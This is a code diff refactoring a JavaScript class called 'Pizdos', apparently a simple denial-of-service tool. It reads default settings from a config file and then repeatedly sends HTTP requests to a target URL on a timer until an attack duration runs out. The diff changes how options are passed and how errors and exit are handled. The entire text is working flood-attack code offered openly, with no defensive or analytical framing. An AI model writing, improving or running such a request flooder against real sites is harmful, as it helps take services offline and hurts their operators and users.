@@ -14,41 +14,32 @@ class Pizdos {
     static attack(url, options) {
         fs.readFile(__dirname + '/../config/standart-options.json',
                     'utf8',
-                    (err, data) => {
-            if (err) throw err
-            
-            const o = Object.assign(JSON.parse(data), options)
+                    (error, data) => {
+            if (error) throw error
 
-            this.startAttack(url,
-                             o.attackDuration,
-                             o.requestsFrequency)
+            this.startAttack(url, Object.assign(JSON.parse(data), options))
         })
     }
 
     // Private.
     /**
      * Starts attack on url.
-     * @param {string} url 
-     * @param {number} processesCount 
-     * @param {number} duration 
-     * @param {number} frequency 
+     * @param {string} url
+     * @param {Object} options
      */
-    static startAttack(url, duration, frequency) {
+    static startAttack(url, options) {
         console.log('Attack is started.')
 
         setInterval(() => {
             request(url, (error) => {
-                if (error) {
-                    console.log('Attack ended with an error.')
-                    process.abort()
-                }
+                if (error) throw 'Attack ended with an error.\n' + error
             })
-        }, frequency)
+        }, options.frequency)
 
         setTimeout(() => {
             console.log('Attack is complete.')
-            process.abort()
-        }, duration)
+            process.exit(0)
+        }, options.duration)
     }
 }
 
